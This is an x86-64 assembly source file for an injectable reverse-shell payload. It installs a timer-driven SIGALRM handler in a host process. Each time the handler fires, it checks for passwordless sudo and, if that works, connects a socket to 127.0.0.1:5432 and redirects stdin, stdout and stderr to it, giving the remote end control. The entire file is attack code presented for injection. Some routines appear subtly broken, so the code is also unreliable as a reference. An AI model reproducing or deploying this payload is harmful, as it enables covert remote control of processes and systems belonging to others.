##
#  This is a reverse "thing-a-ma-bob". Basically whatever you inject
#  it into will give you full remote control over stdin/stdout/stderr
#  connects to 127.0.0.1:5432 when executed

    .text

.global _start

_start:
    push %rbp
    mov %rsp, %rbp

    push %rax

    call setsignalhandler
    call itimer

    pop %rax
    pop %rbp
    ret

remote_shell:
    push %rbp
    mov %rsp, %rbp

    push %rax
    push %rdi
    push %rsi
    push %rdx

    call socket
    mov %rax, %rdi
    # save fd for later
    push %rax
    call connect
    # get the fd for passing
    pop %rdi
    call duplicate

    pop %rdx
    pop %rsi
    pop %rdi
    pop %rax
    pop %rbp

    ret

socket:
    xor %rax, %rax
    xor %rdi, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx

    # sys_socket = 41
    movb $0x29, %al
    # AF_INET = 2
    movb $0x02, %dil
    # SOCK_STREAM = 1
    movb $0x01, %sil
    # proto = 0
    xor %rdx, %rdx

    syscall

    ret

connect:
    push %rbp
    mov %rsp, %rbp

    push %r8

    # rdi is already set to the file descriptor
    xor %rax, %rax
    xor %rsi, %rsi
    xor %rdx, %rdx
    xor %r8, %r8
   
    # sys_connect = 42
    movb $0x2a, %al

    mov %rsp, %r8
    sub $0x10, %r8

    # zero struct sockaddr
    push %rdx
    push %rdx

    # address = 127.0.0.1
    movl $0x0100007f, 0x04(%r8)
    
    #port = 5432
    movw $0x3815, 0x02(%r8)
    
    # family = AF_INET
    movw $0x0002, 0x00(%r8)
    
    # struct sockaddr *uservaddr
    mov %rsp, %rsi
    # addrlen
    movb $0x10, %dl

    syscall

    add $0x10, %rsp
    
    pop %r8
    pop %rbp
    ret

duplicate:
    # rdi is the fd
    push %rbp
    mov %rsp, %rbp
    
    xor %rax, %rax
    xor %rsi, %rsi

    movb $0x21, %al
    syscall

    xor %rax, %rax
    movb $0x21, %al

    movb $0x01, %sil
    syscall

    xor %rax, %rax
    movb $0x21, %al

    movb $0x02, %sil
    syscall

    pop %rbp

    ret



## 
#  sets an itimer using sys_setitimer

itimer:
    push %rbp
    mov %rsp, %rbp
    push %rax
    push %rdi
    push %rsi
    push %rdx

    call settimer

    pop %rdx
    pop %rsi
    pop %rdi
    pop %rax    
    pop %rbp
    ret

settimer:
    # sys_setiitimer = 38
    xor %rax, %rax
    movb $0x26, %al
    
    xor %rdx, %rdx
    xor %rdi, %rdi
    xor %rsi, %rsi


    # current value of the timer = 0
    push %rdx
    movb $0x01, %dl
    push %rdx


    xor %rdx, %rdx
    push %rdx

    # interval to go off = 10 seconds
    movb $0x01, %dl
    push %rdx
    # struct itimerval *value = pointer to our struct on stack
    mov %rsp, %rsi


    # struct interval *oldvalue = NULL
    xor %rdx, %rdx

    # int which = ITIMER_REAL = 0
    syscall
    
    add $0x20, %rsp

    ret


test_sudo:
    push %rbp
    mov %rsp, %rbp
    push %rdi
    push %rsi
    push %rdx

    call shellarg5
    call shellarg4
    call shellarg3
    call shellarg2
    call shellarg1
    call shellarg

    mov (%rsp), %rdi
    mov %rsp, %rsi
    xor %rdi, %rdx
    movb $0x39, %al
    syscall

    add $0x28, %rsp

    pop %rdx
    pop %rsi
    pop %rdi
    pop %rbp
    ret
    

shellarg:
    pop %r8
    call %r8
    .ascii "/usr/bin/sudo"

shellarg1:
    pop %r8
    call %r8
    .ascii "-S"

shellarg2:
    pop %r8
    call %r8
    .ascii "/bin/ls"

shellarg3:
    pop %r8
    call %r8
    .ascii "</dev/null"

shellarg4:
    pop %r8
    call %r8
    .ascii ">/dev/null"

shellarg5:
    pop %r8
    call %r8
    .ascii "2>&1"


setsignalhandler:
    # Save the hosts' stack
    push %rbp
    mov %rsp, %rbp
    
    # Save the hosts' registers
    push %rax
    push %rsi
    push %rdi
    push %rdx
    push %r8
    push %r10

    # Push the address of our restorer function
    call restorer_addr

    # flags = SA_RESTORER | SA_RESTART
    xor %r8, %r8
    mov $0x14000000, %r8
    push %r8

    # Push the address of our handler function
    call handler_addr

    # syscall sys_rt_sigaction
    xor %rax, %rax
    movb $0xd, %al
    
    # rsi = struct sigaction * action
    mov %rsp, %rsi
    # rdx = struct sigaction * old_action (null cause we don't care)
    xor %rdx, %rdx
    # rdi = int signalNumber (SIGALRM)
    xor %rdi, %rdi
    movb $0x0e, %dil
    # r10 = size_t sigsetsize
    xor %r10, %r10
    movb $0x08, %r10b

    # Install the handler
    syscall

    # Move the stack pointer up to remove our sigaction structure
    add $0x18, %rsp

    # Restore the hosts' registers
    pop %r10
    pop %r8
    pop %rdx
    pop %rdi
    pop %rsi
    pop %rax
    pop %rbp
    # Return control to the host
    ret

# Address of the restorer
restorer_addr:
    pop %r8
    call %r8

restorer:
    # Pulled from the libc restorer function
    # sys_rt_sigreturn will take care of restoring registers, masks,
    # flags, and the stack for us
    xor %rax, %rax
    movb $0x0f, %al
    syscall

# Address of our handler function
handler_addr:
    pop %r8
    call %r8

# Signal handler
handler:
    # Note that since we a restorer function we don't need to worry
    # about messing up the registers. The kernel also takes care to
    # provide us our own stack for use here
    xor %rax, %rax
    xor %rdi, %rdi
    xor %rsi, %rsi
    xor %rdx, %rdx

    call test_sudo
    xor %r10, %r10
    cmp %rax, %r10
    je remote_shell

    ret
